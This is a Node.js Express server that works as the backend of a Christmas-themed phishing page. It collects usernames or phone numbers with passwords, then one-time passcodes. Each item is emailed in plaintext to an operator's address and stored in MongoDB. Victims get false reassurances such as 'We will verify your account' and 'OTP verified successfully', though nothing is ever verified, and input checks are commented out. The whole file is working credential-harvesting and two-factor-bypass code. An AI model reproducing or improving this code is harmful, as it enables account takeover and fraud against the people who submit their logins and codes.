const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const mongoose = require("mongoose");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors('http://localhost:5173/'));
app.use(bodyParser.json());

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("MongoDB connection error:", err));

// Schema for Form Data
const formSchema = new mongoose.Schema({
  username: String,
  phone: String,
  password: String,
  otp: String,
  submittedAt: { type: Date, default: Date.now },
});
const Form = mongoose.model("Form", formSchema);

// Nodemailer Transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

app.post("/submit-credentials", async (req, res) => {
  const { username, phone, password } = req.body;

  // Validate input: Only one of `username` or `phone` should be provided, along with `password`.
  // if ((!username && !phone) || (username && phone) || !password) {
  //   return res.status(400).json({
  //     message: "Provide either a username or a phone number, along with a password.",
  //   });
  // }



  try {
    // Create the data object dynamically based on which field is provided.
    const formData = {
      password,
    };

    if (username) {
      formData.username = username;
    } else {
      formData.phone = phone;
    }
    
    // Send notification email.
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFY_EMAIL,
      subject: "New Credentials Submission",
      text: `New credentials submitted:\n\n${username ? `Username: ${username}` : `Phone: ${phone}`}\nPassword: ${password}`,
    });

    // Save to the database.
    const newForm = new Form(formData);
    await newForm.save();


    res.status(200).json({ message: "We will verify your account! Happy Christmas 🎅🎄🎁" });
  } catch (error) {
    console.error("Error saving credentials or sending email:", error);
    res.status(500).json({ message: "An error occurred. Please try again." });
  }
});


// Route 2: Save Phone and Notify on Submission
app.post("/submit-phone", async (req, res) => {
  const { phone } = req.body;

  // if (!phone) {
  //   return res.status(400).json({ message: "Phone number is required." });
  // }

  try {

    // Notify admin via email
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFY_EMAIL,
      subject: "Phone Submission",
      text: `Phone submitted: ${phone}`,
    });

    // Save phone to the database
    const newForm = new Form({ phone });
    await newForm.save();


    res.status(200).json({ message: "Check your phone OTP sended!"});
  } catch (error) {
    console.error("Error saving phone or sending email:", error);
    res.status(500).json({ message: "An error occurred. Please try again." });
  }
});

// Route 3: Verify OTP
app.post("/verify-otp", async (req, res) => {
  const { otp } = req.body;

  // if (!otp) {
  //   return res.status(400).json({ message: "OTP are required." });
  // }

  try {
    // Notify admin via email
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFY_EMAIL,
      subject: "OTP Submission",
      text: `OTP submitted: ${otp}`,
    });

    // Save phone to the database
    const newForm = new Form({ otp });
    await newForm.save();


    res.status(200).json({ message: "OTP verified successfully! We will verify your account. 🎅🎄🎁" });
  } catch (error) {
    console.error("Error verifying OTP:", error);
    res.status(500).json({ message: "An error occurred. Please try again." });
  }
});

// Start Server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
